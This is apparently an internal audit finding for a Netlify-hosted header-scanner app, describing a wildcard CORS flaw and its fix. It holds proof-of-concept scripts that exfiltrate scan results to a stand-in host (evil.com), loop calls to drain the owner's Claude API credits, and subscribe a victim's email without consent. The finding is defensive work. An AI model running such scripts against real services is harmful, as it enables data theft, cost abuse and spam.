# Attack 04 — CORS Wildcard on All API Endpoints

## Status: VULNERABLE — fix required

## Description
All Netlify functions return `Access-Control-Allow-Origin: *`. This means any website on the internet can make cross-origin requests to our APIs from a victim's browser. An attacker-controlled page can silently:
- Call our scan API using the victim's IP (bypasses any IP-based protections)
- Call our explain API burning our Claude API credits
- Call our monitor subscribe endpoint with the victim's email
- Read full scan responses including any sensitive data

## Evidence
```bash
curl -I -X POST https://secureheaders-scanner.netlify.app/.netlify/functions/scan \
  -H "Origin: https://evil-attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://example.com"}'

# Response:
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Methods: POST, OPTIONS
Access-Control-Allow-Origin: *          ← VULNERABLE
```

## Attack Steps

### Step 1 — Attacker hosts malicious page
```html
<!-- evil.com/harvest.html -->
<script>
// Silently calls our API from every visitor's browser
fetch('https://secureheaders-scanner.netlify.app/.netlify/functions/scan', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url: 'https://example.com'})
})
.then(r => r.json())
.then(data => {
  // Full scan result available — can exfiltrate to attacker's server
  fetch('https://evil.com/collect?data=' + btoa(JSON.stringify(data)));
});
</script>
```

### Step 2 — Abuse explain endpoint (Claude API cost attack)
```html
<script>
// Burn the site owner's Claude API credits
for(let i = 0; i < 100; i++) {
  fetch('https://secureheaders-scanner.netlify.app/.netlify/functions/explain', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({url:'https://example.com', score:50, grade:'C', mode:'roadmap'})
  });
}
</script>
```

### Step 3 — Subscribe victim's email to monitoring without consent
```html
<script>
fetch('https://secureheaders-scanner.netlify.app/.netlify/functions/monitor', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    action: 'subscribe',
    email: 'victim@example.com',   // victim's known email
    url: 'https://scamsite.example',
    minGrade: 'A+'
  })
});
// Victim starts receiving unsolicited monitoring emails from our domain
</script>
```

## Severity: HIGH

## Impact
- Claude API bill run up by any malicious website
- Scan API used as an anonymous proxy (requests come from Netlify's IPs, not attacker's)
- Email spam abuse via monitor subscribe
- GDPR/spam law violation if monitor sends emails triggered by cross-origin abuse

## What to fix

### Fix — Restrict CORS to own domain in each function

In `scan.js`, `explain.js`, `config.js`, `subscan.js`:
```js
// Replace:
const cors = { 'Access-Control-Allow-Origin': '*', ... };

// With:
const ALLOWED_ORIGIN = 'https://secureheaders-scanner.netlify.app';
function getCors(event) {
  const origin = event.headers?.origin || event.headers?.Origin || '';
  const allowed = origin === ALLOWED_ORIGIN ? origin : ALLOWED_ORIGIN;
  return {
    'Access-Control-Allow-Origin': allowed,
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Vary': 'Origin'
  };
}
// Then use getCors(event) instead of cors in all return statements
```

### For monitor.js specifically — also add email validation
```js
// In subscribe action, validate email format to prevent abuse:
const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
if (!emailRe.test(email)) {
  return { statusCode: 400, headers: cors, body: JSON.stringify({ error: 'Invalid email' }) };
}
```

## Note on credentials
`Access-Control-Allow-Credentials` is not set to `true`, so cookies/session tokens can't be stolen cross-origin. But all our endpoints are public APIs, so wildcard is still exploitable as described above.
